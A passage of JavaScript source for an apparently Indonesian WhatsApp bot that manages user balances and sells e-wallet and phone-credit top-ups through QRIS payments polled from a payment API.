    // Menambahkan transaksi ke pendapatan.json  
    let pendapatanList = [];  
    try {  
        let dataPendapatan = fs.readFileSync("./src/pendapatan.json", "utf8");  
        if (dataPendapatan) {  
            pendapatanList = JSON.parse(dataPendapatan);  
        }  
    } catch (error) {  
        console.error("❌ Error membaca pendapatan.json, membuat file baru.");  
    }  

    let newData = {  
        harga: parseInt(amount),  
        namaBarang: "Penambahan Saldo",  
        pembayaran: "Saldo",  
        total: parseInt(amount),  
        tanggal: new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }),  
        waktu: getWaktuWIB() // Fungsi untuk mendapatkan waktu dalam WIB  
    };  

    pendapatanList.push(newData);  

    try {  
        fs.writeFileSync("./src/pendapatan.json", JSON.stringify(pendapatanList, null, 2));  
    } catch (error) {  
        console.error("❌ Error saat menyimpan pendapatan.json");  
    }  

    conn.sendMessage(m.chat, {
      buttons: [
        { buttonId: `.ceksaldo`, buttonText: { displayText: 'Cek Saldo' }, type: 1 }
      ],
      footer: `© 2025 ${botname}`,
      headerType: 1,
      viewOnce: true,
      text: `💰 *SALDO USER* 💰\n\n` +  
            `🔹 *ID:* @${m.sender.split("@")[0]}\n` +  
            `🔹 *Nomor:* @${q.split(",")[0]}\n` +  
            `📅 *Tanggal:* ${new Date().toLocaleDateString("id-ID", { timeZone: "Asia/Jakarta" })}\n` +  
            `💵 *Saldo:* Rp${toRupiah(cekSaldo(targetNumber, db_saldo))}\n\n✅ *Saldo berhasil ditambahkan!*`,
      contextInfo: {
        mentionedJid: [m.sender, targetNumber], 
      },
    }, { quoted: m });

}  
case 'kirimsaldo': {  
    let messageText = `✅ *Deposit Berhasil!*\n\n💰 *Jumlah:* Rp${q.split(",")[1]}\n📌 *Saldo Anda telah diperbarui!*\n📝 *Cek saldo dengan mengetik:* .saldo\n\n🙏 Terima kasih!`;  
    let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;  

    conn.sendMessage(targetNumber, {  
        text: `*${messageText}*`,  
        mentions: [m.sender]  
    }, {  
        quoted: m  
    }).then(() => {  
        conn.sendMessage(m.chat, {
          buttons: [
            { buttonId: `.ceksaldo`, buttonText: { displayText: 'Cek Saldo' }, type: 1 }
          ],
          footer: `© 2025 ${botname}`,
          headerType: 1,
          viewOnce: true,
          text: '✅ *Acc Berhasil, Tuan!*',
        }, { quoted: m });
    }).catch(() => {  
        Reply('❌ *Gagal mengirim pesan!*');  
    });  
}  
break;

case 'minsaldo': {  
    if (!isCreator) return Reply(mess.owner);  

    let args = q.split(",");  
    let targetNumber = args[0] + "@s.whatsapp.net";  
    let amount = Number(args[1]);  

    if (!args[0]) return Reply(`⚠️ *Format Salah!*\n\n🔹 Contoh Penggunaan:\n${prefix + command} 628xxx,20000`);  
    if (!args[1]) return Reply(`⚠️ *Format Salah!*\n\n🔹 Contoh Penggunaan:\n${prefix + command} 628xxx,20000`);  

    let currentBalance = cekSaldo(targetNumber, db_saldo);  

    if (currentBalance < amount && currentBalance !== 0) {  
        return Reply(`⚠️ *Saldo Tidak Cukup!*\n\n👤 *User:* @${args[0]}\n💰 *Saldo Saat Ini:* Rp${toRupiah(currentBalance)}\n🚫 *Pengurangan Maksimal:* Rp${toRupiah(currentBalance)}\n🙏 *Jangan melebihi saldo yang ada!*`);  
    }  

    minSaldo(targetNumber, amount, db_saldo);  
    await sleep(50);  

    let teksSaldo = `💰 *SALDO USER* 💰\n\n` +  
                    `🔹 *ID:* ${args[0]}\n` +  
                    `📞 *Nomor:* @${args[0]}\n` +  
                    `📅 *Tanggal:* ${tanggal2}\n` +  
                    `💵 *Saldo Sekarang:* Rp${toRupiah(cekSaldo(targetNumber, db_saldo))}\n\n✅ *Saldo berhasil dikurangi!*`;

    await conn.sendMessage(m.chat, {
      buttons: [
        { buttonId: `.owner`, buttonText: { displayText: 'Developer' }, type: 1 },
        { buttonId: `.ceksaldo`, buttonText: { displayText: 'Cek Saldo' }, type: 1 }
      ],
      footer: `© 2025 ${botname}`,
      headerType: 1,
      viewOnce: true,
      text: teksSaldo,
      contextInfo: {
        isForwarded: true, 
        mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
      },
    }, { quoted: m });
}  
break;

case 'topupsaldo': case 'topupewallet': {
  if (!args[0]) {
    return await conn.sendMessage(m.chat, { 
      text: `❌ *Silakan masukkan nomor e-wallet yang ingin di-topup!*\n\n📌 *Contoh:* *${prefix + command} 081234567890*` 
    }, { quoted: qtext2 });
  }

  let nomor = args[0];

  await conn.sendMessage(m.chat, {
    footer: `© 2025 ${botname} 🤖`,
    buttons: [
      {
        buttonId: 'action',
        buttonText: { displayText: '⚡ Pilih Ewallet' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '💰 Pilih Ewallet',
            sections: [
              {
                title: '🛍️ List Ewallet Tersedia',
                rows: [
                  {
                    title: '💙 TOPUP SALDO DANA',
                    description: 'Isi saldo DANA dengan cepat dan mudah!',
                    id: `.topup-dana ${nomor}`
                  },
                  {
                    title: '💜 TOPUP SALDO OVO',
                    description: 'Top up saldo OVO dengan harga terbaik!',
                    id: `.topup-ovo ${nomor}`
                  },                
                  {
                    title: '💚 TOPUP SALDO GOPAY',
                    description: 'Tambah saldo GoPay hanya dalam hitungan detik!',
                    id: `.topup-gopay ${nomor}`
                  },
                  {
                    title: '🧡 TOPUP SALDO SHOPEEPAY',
                    description: 'Top up ShopeePay instan dan tanpa ribet!',
                    id: `.topup-shopeepay ${nomor}`
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    image: { url: global.image.reply }, 
    caption: `\n📌 *Nomor e-wallet:* ${nomor}\n\n🔹 Silakan pilih e-wallet yang akan Anda topup dengan menekan tombol di bawah ini!`
  }, { quoted: qtext2 });
}
break;

case 'isipulsa': {  
    if (m.isGroup) return m.reply("⚠️ *Pembelian pulsa hanya bisa dilakukan di dalam private chat!*");  
    if (db.users[m.sender].status_deposit) return m.reply("⏳ *Masih ada transaksi yang belum diselesaikan!*\nKetik *.batalbeli* untuk membatalkan transaksi sebelumnya.");  

    let nomor = args[0];  
    let nominal = parseInt(args[1]);  
    let kartu = args.slice(2).join(" ");  

    if (!nomor || !nominal || !kartu) return Reply(`❌ *Format salah!*\nGunakan: *${prefix + command} [nomor] [nominal] [nama kartu]*`);  
    if (nominal < 10000) return Reply("⚠️ *Minimal pengisian pulsa adalah Rp10.000!*");  

    let amount = nominal + generateRandomNumber(800, 1500);  
    const UrlQr = global.qrisOrderKuota;  

    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);  

    const teks3 = `  
🔹 *INFORMASI PEMBAYARAN* 🔹  
    
📌 *ID Transaksi:* ${get.data.result.transactionId}  
💰 *Total Pembayaran:* Rp${await toIDR(get.data.result.amount)}  
📞 *Nomor HP:* ${nomor}  
📦 *Nominal Pulsa:* Rp${nominal}  
📡 *Kartu:* ${kartu}  
⏳ *Batas Waktu:* 5 Menit  
  
⚠️ *Catatan:*  
- QRIS pembayaran hanya berlaku selama 5 menit, jika melewati batas waktu maka pembayaran dianggap tidak valid.  
- Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status transaksi kamu.  
- Jika ingin membatalkan transaksi, ketik *.batalbeli* 🚫  
`;  

    let msgQr = await conn.sendMessage(m.chat, {  
        footer: `© 2025 ${botname} 🚀`,  
        buttons: [  
            {  
                buttonId: `.batalbeli`,  
                buttonText: { displayText: '❌ Batalkan Pembelian' },  
                type: 1  
            }  
        ],  
        headerType: 1,  
        viewOnce: true,  
        image: { url: get.data.result.qrImageUrl },   
        caption: teks3,  
        contextInfo: {  
            mentionedJid: [m.sender]  
        },  
    });  

    db.users[m.sender].status_deposit = true;  
    db.users[m.sender].transaksi = {  
        chat: m.sender,  
        idDeposit: get.data.result.transactionId,  
        amount: get.data.result.amount.toString(),  
        nomor: nomor,  
        nominal: nominal,  
        kartu: kartu,  
        exp: function () {  
            setTimeout(async () => {  
                if (db.users[m.sender].status_deposit) {  
                    await conn.sendMessage(m.sender, {text: "⏳ *QRIS Pembayaran telah expired!*"}, {quoted: msgQr});  
                    db.users[m.sender].status_deposit = false;  
                    delete db.users[m.sender].transaksi;  
                }  
            }, 300000);  
        }  
    };  

    await db.users[m.sender].transaksi.exp();  

    while (db.users[m.sender].status_deposit) {  
        await sleep(8000);  
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);  
        const req = await resultcek.data;  

        if (req?.amount == db.users[m.sender].transaksi.amount) {  
            db.users[m.sender].status_deposit = false;  
            let teksSukses = `  
✅ *PEMBAYARAN BERHASIL!* 🎉  

📌 *ID Transaksi:* ${db.users[m.sender].transaksi.idDeposit}  
💰 *Total Pembayaran:* Rp${await toIDR(db.users[m.sender].transaksi.amount)}  
📞 *Nomor HP:* ${db.users[m.sender].transaksi.nomor}  
📦 *Nominal Pulsa:* Rp${db.users[m.sender].transaksi.nominal}  
📡 *Kartu:* ${db.users[m.sender].transaksi.kartu}  

📩 *Silakan hubungi owner untuk pengisian pulsa!*  
            `;  

            await conn.sendMessage(m.chat, {  
                footer: `© 2025 ${botname}`,  
                buttons: [  
                    {  
                        buttonId: `.owner`,  
                        buttonText: { displayText: '📞 Hubungi Developer Segera' },  
                        type: 1  
                    }  
                ],  
                headerType: 1,  
                viewOnce: true,  
                text: teksSukses,  
                contextInfo: {  
                    isForwarded: true,  
                    mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],  
                },  
            }, {quoted: msgQr});  

            delete db.users[m.sender].transaksi;  
        }  
    }  
}  
break;

case 'topup-dana': {
if (m.isGroup) return m.reply("⚠️ *Top-up Dana hanya bisa dilakukan dalam private chat!*")
if (db.users[m.sender].status_deposit) return m.reply("⏳ *Masih ada transaksi yang belum diselesaikan!*\nKetik *.batalbeli* untuk membatalkan transaksi sebelumnya ❌")

// Jika user belum memasukkan nomor Dana
if (!text) return m.reply("📌 *Silakan masukkan nomor Dana terlebih dahulu!*\n\n📌 Format: *.topup-dana <nomor_dana>*")

let nomorDana = text.trim()

if (!/^\d{10,13}$/.test(nomorDana)) return m.reply("🚫 *Nomor Dana tidak valid!*\nMohon masukkan nomor yang benar. ☑️")

db.users[m.sender].temp_nomorDana = nomorDana

// Daftar nominal top-up beserta harga tetap
let nominalHarga = {
    1000: 1500,
    5000: 7000,
    10000: 12000,
    20000: 23000,
    25000: 28000,
    50000: 53000,
    75000: 78000,
    100000: 105000
};

// Membuat daftar nominal top-up dengan tombol interaktif
let amounts = Object.entries(nominalHarga).map(([nominal, harga]) => ({
    title: `💰 Rp${parseInt(nominal).toLocaleString()} ➝ Rp${harga.toLocaleString()}`,
    id: `.pilih-nominal ${nominal}`
}));

// Menyusun daftar harga tetap dalam bentuk teks
let hargaTetapList = Object.entries(nominalHarga)
    .map(([nominal, harga]) => `💰 *Rp${parseInt(nominal).toLocaleString()}* ➝ *Rp${harga.toLocaleString()}*`)
    .join("\n");

// Mengirim pesan dengan tombol pilihan nominal
return await conn.sendMessage(m.chat, {
    footer: `© 2025 ${botname} 🚀`,
    buttons: [
      { 
        buttonId: `.owner`, 
        buttonText: { displayText: '👨‍💻 Hubungi Developer' }, 
        type: 1 
      },
      {
        buttonId: 'action',
        buttonText: { displayText: '💸 Pilih Nominal' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '💳 Pilih Nominal Top-up',
            sections: [
              {
                title: '📌 Daftar Nominal & Harga',
                rows: amounts
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    image: { url: global.image.reply },
    caption: `🔹 *Nomor Dana:* *${nomorDana}*\n\n📌 *Daftar Harga Tetap:*\n${hargaTetapList}\n\n🔹 *Silakan pilih jumlah top-up beserta harga dari tombol di bawah ini.*`,
    contextInfo: {
      isForwarded: true, 
      mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
    },
  }, { quoted: qtext2 });
}

case 'pilih-nominal': {  
    if (!db.users[m.sender].temp_nomorDana) 
        return m.reply("⚠️ *Silakan masukkan nomor Dana terlebih dahulu dengan perintah:*\n*.topup-dana <nomor_dana>*");

    let jumlahTopup = parseInt(text);
    
    // Daftar nominal dengan harga tetap
    let nominalHarga = {
        1000: 1500,
        5000: 7000,
        10000: 12000,
        20000: 23000,
        25000: 28000,
        50000: 53000,
        75000: 78000,
        100000: 105000
    };

    if (!nominalHarga[jumlahTopup]) 
        return m.reply("🚫 *Nominal tidak tersedia!*\nSilakan pilih dari daftar yang diberikan. 📜");

    let nomorDana = db.users[m.sender].temp_nomorDana;
    let totalPembayaran = nominalHarga[jumlahTopup];

    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${totalPembayaran}&codeqr=${global.qrisOrderKuota}`);

    const teks3 = `  
🟢 *INFORMASI PEMBAYARAN*  

🔹 *ID:* ${get.data.result.transactionId}  
🔹 *Nomor Dana:* ${nomorDana}  
🔹 *Jumlah Top-up:* Rp${await toIDR(jumlahTopup)}  
🔹 *Total Pembayaran:* Rp${await toIDR(totalPembayaran)}  
🔹 *Expired:* ⏳ 5 menit  

⚠️ *Note:*    
📌 QRIS pembayaran hanya berlaku selama *5 menit*. Jika sudah melewati waktu tersebut, pembayaran dinyatakan *tidak valid*!    
📌 Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.  

🔴 *Ketik *.batalbeli* untuk membatalkan transaksi*  
`;

    let msgQr = await conn.sendMessage(m.chat, {  
        footer: `© 2025 ${botname} 🚀`,  
        buttons: [  
            {  
                buttonId: `.batalbeli`,  
                buttonText: { displayText: '❌ Batalkan Pembelian' },  
                type: 1  
            }  
        ],  
        headerType: 1,  
        viewOnce: true,  
        image: { url: get.data.result.qrImageUrl },   
        caption: teks3,  
        contextInfo: {  
            mentionedJid: [m.sender]  
        },  
    });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {  
        msg: msgQr,   
        chat: m.sender,  
        idDeposit: get.data.result.transactionId,   
        amount: totalPembayaran.toString(),  
        nomorDana: nomorDana,  
        topup: jumlahTopup.toString(),  
        exp: function () {  
            setTimeout(async () => {  
                if (db.users[m.sender].status_deposit == true) {  
                    await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ *QRIS Pembayaran telah expired!*"}, {quoted: db.users[m.sender].saweria.msg});  
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });  
                    db.users[m.sender].status_deposit = false;  
                    await clearInterval(db.users[m.sender].saweria.exp);  
                    delete db.users[m.sender].saweria;  
                }  
            }, 300000);  
        }  
    };

    await db.users[m.sender].saweria.exp();  

    while (db.users[m.sender].status_deposit == true) {  
        await sleep(8000);  
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);  
        const req = await resultcek.data;  

        if (req?.amount == db.users[m.sender].saweria.amount) {  
            db.users[m.sender].status_deposit = false;  
            await clearInterval(db.users[m.sender].saweria.exp);  
            await conn.sendMessage(db.users[m.sender].saweria.chat, {  
                text: `  
✅ *PEMBAYARAN BERHASIL DITERIMA!*  

🔹 *ID:* ${db.users[m.sender].saweria.idDeposit}  
🔹 *Nomor Dana:* ${db.users[m.sender].saweria.nomorDana}  
🔹 *Jumlah Top-up:* Rp${await toIDR(db.users[m.sender].saweria.topup)}  
🔹 *Total Pembayaran:* Rp${await toIDR(db.users[m.sender].saweria.amount)}  

⚠️ *NOTE:*    
📌 Jika sudah transfer, segera hubungi *Developer* kami untuk mengisi saldo Anda!    
`}, {quoted: db.users[m.sender].saweria.msg});  

            await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });  
            delete db.users[m.sender].saweria;  
        }  
    }  
}  
break;

case 'topup-gopay': {
if (m.isGroup) return m.reply("⚠️ *Top-up GoPay hanya bisa dilakukan dalam private chat!*")
if (db.users[m.sender].status_deposit) return m.reply("⏳ *Masih ada transaksi yang belum diselesaikan!*\nKetik *.batalbeli* untuk membatalkan transaksi sebelumnya ❌")

// Jika user belum memasukkan nomor GoPay
if (!text) return m.reply("📌 *Silakan masukkan nomor GoPay terlebih dahulu!*\n\n📌 Format: *.topup-gopay <nomor_gopay>*")

let nomorGopay = text.trim()

if (!/^\d{10,13}$/.test(nomorGopay)) return m.reply("🚫 *Nomor GoPay tidak valid!*\nMohon masukkan nomor yang benar. ☑️")

db.users[m.sender].temp_nomorGopay = nomorGopay

// Daftar nominal dengan harga tetap
let nominalHarga = {
    1000: 1500,
    5000: 7000,
    10000: 12000,
    20000: 23000,
    25000: 28000,
    50000: 53000,
    75000: 78000,
    100000: 105000
};

// Membuat daftar nominal top-up dengan tombol interaktif
let amounts = Object.entries(nominalHarga).map(([nominal, harga]) => ({
    title: `💰 Rp${parseInt(nominal).toLocaleString()} ➝ Rp${harga.toLocaleString()}`,
    id: `.pilih-nominal-gopay ${nominal}`
}));

// Menyusun daftar harga tetap dalam bentuk teks
let hargaTetapList = Object.entries(nominalHarga)
    .map(([nominal, harga]) => `💰 *Rp${parseInt(nominal).toLocaleString()}* ➝ *Rp${harga.toLocaleString()}*`)
    .join("\n");

// Mengirim pesan dengan tombol pilihan nominal
return await conn.sendMessage(m.chat, {
    footer: `© 2025 ${botname} 🚀`,
    buttons: [
      { 
        buttonId: `.owner`, 
        buttonText: { displayText: '👨‍💻 Hubungi Developer' }, 
        type: 1 
      },
      {
        buttonId: 'action',
        buttonText: { displayText: '💸 Pilih Nominal' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '💳 Pilih Nominal Top-up',
            sections: [
              {
                title: '📌 Daftar Nominal & Harga',
                rows: amounts
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    image: { url: global.image.reply },
    caption: `🔹 *Nomor GoPay:* *${nomorGopay}*\n\n📌 *Daftar Harga Tetap:*\n${hargaTetapList}\n\n🔹 *Silakan pilih jumlah top-up beserta harga dari tombol di bawah ini.*`,
    contextInfo: {
      isForwarded: true, 
      mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
    },
  }, { quoted: qtext2 });
}

case 'pilih-nominal-gopay': {  
    if (!db.users[m.sender].temp_nomorGopay) 
        return m.reply("⚠️ *Silakan masukkan nomor GoPay terlebih dahulu dengan perintah:*\n*.topup-gopay <nomor_gopay>*");

    let jumlahTopup = parseInt(text);
    
    // Daftar harga tetap
    let nominalHarga = {
        1000: 1500,
        5000: 7000,
        10000: 12000,
        20000: 23000,
        25000: 28000,
        50000: 53000,
        75000: 78000,
        100000: 105000
    };

    if (!nominalHarga[jumlahTopup]) 
        return m.reply("🚫 *Nominal tidak tersedia!*\nSilakan pilih dari daftar yang diberikan. 📜");

    let nomorGopay = db.users[m.sender].temp_nomorGopay;
    let totalPembayaran = nominalHarga[jumlahTopup];

    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${totalPembayaran}&codeqr=${global.qrisOrderKuota}`);

    const teks3 = `  
🟢 *INFORMASI PEMBAYARAN*  

🔹 *ID:* ${get.data.result.transactionId}  
🔹 *Nomor GoPay:* ${nomorGopay}  
🔹 *Jumlah Top-up:* Rp${await toIDR(jumlahTopup)}  
🔹 *Total Pembayaran:* Rp${await toIDR(totalPembayaran)}  
🔹 *Expired:* ⏳ 5 menit  

⚠️ *Note:*  
📌 QRIS pembayaran hanya berlaku selama *5 menit*. Jika sudah melewati waktu tersebut, pembayaran dinyatakan *tidak valid*!  
📌 Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.  

🔴 *Ketik *.batalbeli* untuk membatalkan transaksi*  
`;

    let msgQr = await conn.sendMessage(m.chat, {  
        footer: `© 2025 ${botname} 🚀`,  
        buttons: [  
            {  
                buttonId: `.batalbeli`,  
                buttonText: { displayText: '❌ Batalkan Pembelian' },  
                type: 1  
            }  
        ],  
        headerType: 1,  
        viewOnce: true,  
        image: { url: get.data.result.qrImageUrl },   
        caption: teks3,  
        contextInfo: {  
            mentionedJid: [m.sender]  
        },  
    });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {  
        msg: msgQr,   
        chat: m.sender,  
        idDeposit: get.data.result.transactionId,   
        amount: totalPembayaran.toString(),  
        nomorGopay: nomorGopay,  
        topup: jumlahTopup.toString(),  
        exp: function () {  
            setTimeout(async () => {  
                if (db.users[m.sender].status_deposit == true) {  
                    await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ *QRIS Pembayaran telah expired!*"}, {quoted: db.users[m.sender].saweria.msg});  
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });  
                    db.users[m.sender].status_deposit = false;  
                    await clearInterval(db.users[m.sender].saweria.exp);  
                    delete db.users[m.sender].saweria;  
                }  
            }, 300000);  
        }  
    };

    await db.users[m.sender].saweria.exp();  

    while (db.users[m.sender].status_deposit == true) {  
        await sleep(8000);  
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);  
        const req = await resultcek.data;  

        if (req?.amount == db.users[m.sender].saweria.amount) {  
            db.users[m.sender].status_deposit = false;  
            await clearInterval(db.users[m.sender].saweria.exp);  
            await conn.sendMessage(db.users[m.sender].saweria.chat, {  
                text: `  
✅ *PEMBAYARAN BERHASIL DITERIMA!*  

🔹 *ID:* ${db.users[m.sender].saweria.idDeposit}  
🔹 *Nomor GoPay:* ${db.users[m.sender].saweria.nomorGopay}  
🔹 *Jumlah Top-up:* Rp${await toIDR(db.users[m.sender].saweria.topup)}  
🔹 *Total Pembayaran:* Rp${await toIDR(db.users[m.sender].saweria.amount)}  

⚠️ *NOTE:*  
📌 Jika sudah transfer, segera hubungi *Developer* kami untuk mengisi saldo Anda!  
`}, {quoted: db.users[m.sender].saweria.msg});  

            await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });  
            delete db.users[m.sender].saweria;  
        }  
    }  
}  
break;

case 'topup-ovo': { 
    if (m.isGroup) return m.reply("❌ Top-up OVO hanya bisa dilakukan dalam private chat!");
    if (db.users[m.sender].status_deposit) 
        return m.reply("⚠️ Masih ada transaksi yang belum diselesaikan! Ketik .batalbeli untuk membatalkan transaksi sebelumnya.");

    if (!text) 
        return m.reply("📌 Silakan masukkan nomor OVO terlebih dahulu!\n\nFormat: .topup-ovo <nomor_ovo>");

    let nomorOvo = text.trim();

    if (!/^\d{10,13}$/.test(nomorOvo)) 
        return m.reply("❌ Nomor OVO tidak valid! Masukkan nomor yang benar.");

    db.users[m.sender].temp_nomorOvo = nomorOvo;

    // Daftar nominal dengan harga tetap
    let nominalHarga = {
        1000: 1500,
        5000: 7000,
        10000: 12000,
        20000: 23000,
        25000: 28000,
        50000: 53000,
        75000: 78000,
        100000: 105000
    };

    // Membuat daftar nominal top-up dengan tombol interaktif
    let amounts = Object.entries(nominalHarga).map(([nominal, harga]) => ({
        title: `💰 Rp${parseInt(nominal).toLocaleString()} ➝ Rp${harga.toLocaleString()}`,
        id: `.pilih-nominal-ovo ${nominal}`
    }));

    // Menyusun daftar harga tetap dalam bentuk teks
    let hargaTetapList = Object.entries(nominalHarga)
        .map(([nominal, harga]) => `💰 *Rp${parseInt(nominal).toLocaleString()}* ➝ *Rp${harga.toLocaleString()}*`)
        .join("\n");

    return await conn.sendMessage(m.chat, { 
        footer: `© 2025 ${botname} 🚀`, 
        buttons: [ 
            { buttonId: '.owner', buttonText: { displayText: '👨‍💻 Hubungi Developer' }, type: 1 }, 
            { 
                buttonId: 'action', 
                buttonText: { displayText: '💵 Pilih Nominal' }, 
                type: 4, 
                nativeFlowInfo: { 
                    name: 'single_select', 
                    paramsJson: JSON.stringify({ 
                        title: '📊 Pilih Nominal Top-up', 
                        sections: [ { title: '📜 Daftar Nominal', rows: amounts } ] 
                    }) 
                } 
            } 
        ], 
        headerType: 1, 
        viewOnce: true, 
        image: { url: global.image.reply }, 
        caption: `📲 *Nomor OVO:* *${nomorOvo}*\n\n📌 *Daftar Harga Tetap:*\n${hargaTetapList}\n\n🔹 *Silakan pilih jumlah top-up beserta harga dari tombol di bawah ini.*`,
        contextInfo: { 
            isForwarded: true, 
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
        }, 
    }, { quoted: qtext2 }); 
}

case 'pilih-nominal-ovo': {  
    if (!db.users[m.sender].temp_nomorOvo)  
        return m.reply("⚠️ Silakan masukkan nomor OVO terlebih dahulu dengan perintah: *.topup-ovo <nomor_ovo>*");

    let jumlahTopup = parseInt(text);
    let hargaTetap = {
        1000: 1500,
        5000: 7000,
        10000: 12000,
        20000: 23000,
        25000: 28000,
        50000: 53000,
        75000: 78000,
        100000: 105000
    };

    if (!hargaTetap[jumlahTopup])  
        return m.reply("❌ Nominal tidak tersedia! Pilih dari daftar yang diberikan.");

    let nomorOvo = db.users[m.sender].temp_nomorOvo;
    let totalPembayaran = hargaTetap[jumlahTopup];

    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${totalPembayaran}&codeqr=${global.qrisOrderKuota}`);

    const teks3 = `  
🎯 *INFORMASI PEMBAYARAN*  

🆔 *ID:* ${get.data.result.transactionId}  
📱 *Nomor OVO:* ${nomorOvo}  
💸 *Jumlah Top-up:* Rp${await toIDR(jumlahTopup)}  
💰 *Total Pembayaran:* Rp${await toIDR(get.data.result.amount)}  
⏳ *Expired:* 5 menit  

⚠️ *Note:*  
🔹 QRIS pembayaran hanya berlaku dalam 5 menit! Jika sudah melewati waktu, pembayaran dinyatakan tidak valid.  
🔹 Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.  

🔄 Ketik *.batalbeli* untuk membatalkan transaksi.  
`;

    let msgQr = await conn.sendMessage(m.chat, {  
        footer: `© 2025 ${botname} 🚀`,  
        buttons: [  
            {  
                buttonId: `.batalbeli`,  
                buttonText: { displayText: '❌ Batalkan Pembelian' },  
                type: 1  
            }  
        ],  
        headerType: 1,  
        viewOnce: true,  
        image: { url: get.data.result.qrImageUrl },   
        caption: teks3,  
        contextInfo: {  
            mentionedJid: [m.sender]  
        },  
    });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {  
        msg: msgQr,   
        chat: m.sender,  
        idDeposit: get.data.result.transactionId,   
        amount: get.data.result.amount.toString(),  
        nomorOvo: nomorOvo,  
        topup: jumlahTopup.toString(),  
        exp: function () {  
            setTimeout(async () => {  
                if (db.users[m.sender].status_deposit == true) {  
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "⚠️ QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });  
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });  
                    db.users[m.sender].status_deposit = false;  
                    await clearInterval(db.users[m.sender].saweria.exp);  
                    delete db.users[m.sender].saweria;  
                }  
            }, 300000);  
        }  
    };

    await db.users[m.sender].saweria.exp();  

    while (db.users[m.sender].status_deposit == true) {  
        await sleep(8000);  
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);  
        const req = await resultcek.data;  

        if (req?.amount == db.users[m.sender].saweria.amount) {  
            db.users[m.sender].status_deposit = false;  
            await clearInterval(db.users[m.sender].saweria.exp);  
            await conn.sendMessage(db.users[m.sender].saweria.chat, {  
                text: `  
✅ *PEMBAYARAN BERHASIL DITERIMA!*  

🆔 *ID:* ${db.users[m.sender].saweria.idDeposit}  
📱 *Nomor OVO:* ${db.users[m.sender].saweria.nomorOvo}  
💸 *Jumlah Top-up:* Rp${await toIDR(db.users[m.sender].saweria.topup)}  
💰 *Total Pembayaran:* Rp${await toIDR(db.users[m.sender].saweria.amount)}  

🚀 *NOTE:*  
Jika sudah transfer, segera hubungi developer kami untuk mengisi saldo Anda! 🛠️  
`}, { quoted: db.users[m.sender].saweria.msg });  

            await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });  
            delete db.users[m.sender].saweria;  
        }  
    }  
}  
break;

case 'topup-shopeepay': {
    if (m.isGroup) return m.reply("❌ Top-up ShopeePay hanya bisa dilakukan dalam private chat!");
    if (db.users[m.sender].status_deposit) 
        return m.reply("⚠️ Masih ada transaksi yang belum diselesaikan! Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya.");

    if (!text) 
        return m.reply("📌 Silakan masukkan nomor ShopeePay terlebih dahulu!\n\nFormat: *.topup-shopeepay <nomor_shopeepay>*");

    let nomorShopeePay = text.trim();

    if (!/^\d{10,13}$/.test(nomorShopeePay)) 
        return m.reply("❌ Nomor ShopeePay tidak valid! Masukkan nomor yang benar.");

    db.users[m.sender].temp_nomorShopeePay = nomorShopeePay;

    let hargaTetap = {
        1000: 1500,
        5000: 7000,
        10000: 12000,
        20000: 23000,
        25000: 28000,
        50000: 53000,
        75000: 78000,
        100000: 105000
    };

    let amounts = Object.keys(hargaTetap).map(nominal => ({
